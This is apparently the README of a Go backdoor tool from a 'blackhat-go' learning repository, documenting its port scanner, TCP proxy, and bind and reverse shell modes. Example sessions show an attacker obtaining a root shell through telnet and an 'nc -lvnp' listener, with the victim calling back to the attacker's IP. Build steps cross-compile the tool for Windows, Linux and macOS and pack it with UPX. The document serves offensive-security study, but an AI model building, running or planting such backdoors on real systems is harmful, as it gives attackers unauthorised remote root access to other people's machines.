# backdoor

## Help Menu
```
$ ./cmd 
Expected 'Client', 'Server', 'Scanner', 'Proxy', or 'Netcat' commands with a subcommand.

$ ./cmd Scanner -h
Usage of Scanner:
  -host string
        Hostname or IP we want to scan (default "127.0.0.1")
  -port string
        Port, or ports, to scan.
        Examples:
            22
            1-1000
            22,443 (default "0")

$ ./cmd Proxy -h
Usage of Proxy:
  -port int
        Port to bind to on this client.
        Example:
            8000
            1337 (default 8000)
  -target-host string
        Hostname to be our end target. (default "google.com")
  -target-port int
        Port to query on our end target host. (default 80)

$ ./cmd Netcat -h
Usage of Netcat:
  -address string
        If bind shell, we listen on localhost, if reverse shell, add the attacker IP or host. (default "127.0.0.1")
  -bind
        Create a bind shell. This will bind to the specified port, opening access to anyone who connects.
  -port int
        Bind to port on this host. (default 8000)
  -reverse
        Reverse shell. Provide Attacker IP or hostname to call back to.
```

## Example Scanner
```
./cmd Scanner --host 127.0.0.1 --port 1-60000
111 open
631 open
5900 open
36167 open
54103 open
57621 open
```

## Example Proxy
```
Server

./cmd Proxy --port 8000 --target-host facebook.com --target-port 443
2024/02/06 15:28:22 Listening on port 8000
2024/02/06 15:28:32 Received connection from 192.168.1.11:47962!
2024/02/06 15:28:32 Reaching out to facebook.com on port 443

Client

└─$ curl https://192.168.1.10:8000 -k  
<!DOCTYPE html><html lang="en" id="facebook"><head><title>Error</title><meta charset="utf-8" /><meta http-equiv="Cache-Control" content="no-cache" /><meta name="robots" content="noindex,nofollow" /><style nonce="wfWasHre">html, body { color: #333; font-family: 'Lucida Grande', 'Tahoma', 'Verdana', 'Arial', sans-serif; margin: 0; padding: 0; text-align: center;}
#header { height: 30px; padding-bottom: 10px; padding-top: 10px; text-align: center;}
#icon { width: 30px;}
.core { margin: auto; padding: 1em 0; text-align: left; width: 904px;}
h1 { font-size: 18px;}
p { font-size: 13px;}
.footer { border-top: 1px solid #ddd; color: #777; float: left; font-size: 11px; padding: 5px 8px 6px 0; width: 904px;}</style></head><body><div id="header"><a href="//www.facebook.com/"><img id="icon" src="//static.facebook.com/images/logos/facebook_2x.png" /></a></div><div class="core"><h1>Sorry, something went wrong.</h1><p>We&#039;re working on getting this fixed as soon as we can.</p><p><a id="back" href="//www.facebook.com/">Go back</a></p><div class="footer"> Meta &#169; 2024 &#183; <a href="//www.facebook.com/help/?ref=href052">Help</a></div></div><script nonce="wfWasHre">
              document.getElementById("back").onclick = function() {
                if (history.length > 1) {
                  history.back();
                  return false;
                }
              };
            </script></body></html><!-- @codegen-command : phps GenerateErrorPages --><!-- @generated SignedSource<<f06de9d674e466d31c38de4e1e683a0e>> -->
```

## Example Netcat Bind Shell
```
Victim 
./cmd Netcat --address 127.0.0.1 --bind --port 8000
2024/02/06 15:30:15 [*] Binding shell spawning for remote code execution
2024/02/06 15:30:21 Received connection from 192.168.1.11:56510!

Attacker
└─$ telnet 192.168.1.10 8000
Trying 192.168.1.10...
Connected to 192.168.1.10.
Escape character is '^]'.
whoami
root
```

## Example Netcat Reverse Shell
```
Victim
./cmd Netcat --address 192.168.1.11 --port 8000 --reverse
2024/02/06 15:35:47 dial tcp 192.168.1.11:8000: connect: connection refused
2024/02/06 15:35:47 [*] Retrying in 5 seconds
2024/02/06 15:35:52 [*] Rev shell spawning, connecting to 192.168.1.11:8000

Attacker
└─$ nc -lvnp 8000
listening on [any] 8000 ...
connect to [192.168.1.11] from (UNKNOWN) [192.168.1.10] 36310
whoami
root
```

# Build Instructions

## Windows
```
~/blackhat-go/backdoor/cmd$ env GOOS=windows GOARCH=amd64 go build

~/blackhat-go/backdoor/cmd$ file cmd.exe
cmd.exe: PE32+ executable (console) x86-64, for MS Windows
```

## Linux
```
# static binary, no linked libraries
~/blackhat-go/backdoor/cmd$ CGO_ENABLED=0 go build

~/blackhat-go/backdoor/cmd$ file cmd
cmd: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=P83-EZpwXiaTx8UEc6km/1fJtGaHFhIhYy31U2CdL/3ELf7H_vRHE-k5kN61Q3/n8xRjKrQJmLfPMAJ-JsY, with debug_info, not stripped

~/blackhat-go/backdoor/cmd$ ldd cmd
        not a dynamic executable
```

## OSX
```
~/blackhat-go/backdoor/cmd$ env GOOS=darwin GOARCH=amd64 go build

~/blackhat-go/backdoor/cmd$ file cmd
cmd: Mach-O 64-bit x86_64 executable
```

## Compression

* Golang binaries are beefy bois. We can try to trim them down a bit.

``` 
~/blackhat-go/backdoor/cmd$ ls -alh cmd.exe 
-rwxrwxr-x 1 someuser somegroup 2.9M Dec 20 12:25 cmd.exe

~/blackhat-go/backdoor/cmd$ upx-ucl -9 cmd.exe 
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2020
UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
   3040256 ->   1830400   60.21%    win64/pe     cmd.exe               

Packed 1 file.

~/blackhat-go/backdoor/cmd$ ls -alh cmd.exe 
-rwxrwxr-x 1 someuser somegroup 1.8M Dec 20 12:25 cmd.exe
```
